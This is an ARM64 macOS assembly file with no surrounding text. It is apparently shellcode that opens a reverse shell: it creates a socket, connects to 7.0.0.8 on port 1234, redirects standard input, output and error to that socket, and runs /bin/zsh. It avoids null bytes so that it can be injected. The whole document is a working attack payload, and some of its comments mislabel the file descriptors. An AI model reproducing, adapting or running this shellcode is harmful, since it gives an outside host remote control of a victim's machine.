.global _main
.align 4

_main:
        ;;; (1) obtain socket file descriptor
    mov     X3, #0x0201         ; * address family PF_INET = 2
    lsr     X0, X3, #8          ; *
    lsr     X1, X0, #1          ; * connection type = 1 (move 0x0101 to avoid Null byte)
    mov     X2, XZR             ; protocol IPPROTO_IP = 0
    mov     X16, #0x61          ; BSD system call 97 for socket
    svc     #0xFFFF             ; call kernel to obtain socket, return value in X0
    lsl     X19, X0, #0         ; * save socket descriptor into X19
        ;;; (2) connect socket to remote address 7.0.0.8 = 0x07 0x00 0x00 0x08
    mov     X3, #0x08FF         ; ** move IP address into lower two bytes of X3
    sub     X3, X3, #0xFF       ; **
    lsl     X3, X3, #16         ; **
    movk    X3, #0x00FF, lsl#0  ; **
    sub     X3, X3, #0xF8       ; **
    lsl     X3, X3, #32         ; ** shift IP address into higher two bytes of X3
    movk    X3, #0x0200, lsl#0  ; ** set sin_len = 0, sin_family = 2 = PF_INET
    movk    X3, #0xD204, lsl#16 ; ** sin_port = 1234 (big endian)
    stp     X3, XZR, [SP,#-16]! ; push sockaddr_in struct to stack (XZR for 0 padding)
    add     X1, SP, XZR         ; pointer to sockaddr_in struct
    mov     X2, #0x10           ; length of sockaddr_in struct
    mov     X16, #98            ; BSD system call 98  for connect
    svc     #0xFFFF             ; call kernel to connect socket to remote address
        ;;; (3) duplicate file descriptors STDIN, STDOUT, STDERR
    mov     X0, X19             ; restore socket descriptor to X0
    mov     X1, #0x0201         ; * file descriptor 2 = STDERR
    lsr     X1, X1, #8          ; *
    mov     X16, #0x5A          ; BSD system call number for dup2
    svc     #0xFFFF             ; call kernel to duplicate STDERR
    mov     X0, X19             ; restore socket descriptor to X0
    mov     X1, #0x0101         ; * file descriptor 1 = STDIN
    lsr     X1, X1, #8          ; *
    svc     #0xFFFF             ; call kernel to duplicate STDOUT
    mov     X0, X19             ; restore socket descriptor to X0
    mov     X1, XZR             ; file descriptor 0 = STDOUT
    svc     #0xFFFF             ; call kernel to duplicate STDIN
        ;;; (4) launch shell via execve
    mov     X3, #0x622F         ; move "/bin/zsh" into X3 (little endian) in four moves
    movk    X3, #0x6E69, lsl#16
    movk    X3, #0x7A2F, lsl#32
    movk    X3, #0x6873, lsl#48
    stp     X3, XZR, [SP,#-16]! ; push fname and terminating 0 to stack
    add     X0, SP, XZR         ; save pointer to argv[0]
    stp     X0, XZR, [SP,#-16]! ; push argv[0] and terminating 0 to stack
    add     X1, SP, XZR         ; move pointer to argp into X1
    mov     X2, XZR             ; third argument for execve
    mov     X16, #59            ; BSD system call 59 number for execve
    svc     #0xFFFF             ; call kernel to run execve
